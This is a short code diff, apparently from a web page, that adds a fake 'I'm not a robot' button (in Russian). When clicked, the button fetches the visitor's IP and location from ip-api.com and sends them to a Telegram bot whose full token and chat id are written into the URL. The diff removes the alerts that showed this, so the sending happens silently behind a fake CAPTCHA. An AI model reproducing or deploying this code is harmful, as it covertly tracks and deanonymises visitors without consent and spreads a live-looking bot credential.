@@ -1,5 +1,10 @@
+<center>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script> 
+<button onclick="start()">Я не робот</button>
+</center>
 <script>
-var requestUrl = "http://ip-api.com/json";
+	start = function() {
+		var requestUrl = "http://ip-api.com/json";
 
 $.ajax({
   url: requestUrl,
@@ -96,8 +101,6 @@ xhr.send();
 
 var ip = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Айпи: "+json.query
 
-alert(ip)
-
 var xhr = new XMLHttpRequest();
 xhr.open("POST", ip);
 
@@ -154,7 +157,8 @@ xhr.send();
   },
   error: function(err)
   {
-    alert("Request failed, error= " + err);
+    console.log("Request failed, error= " + err);
   }
 });
-			</script>
+		}
+	</script>
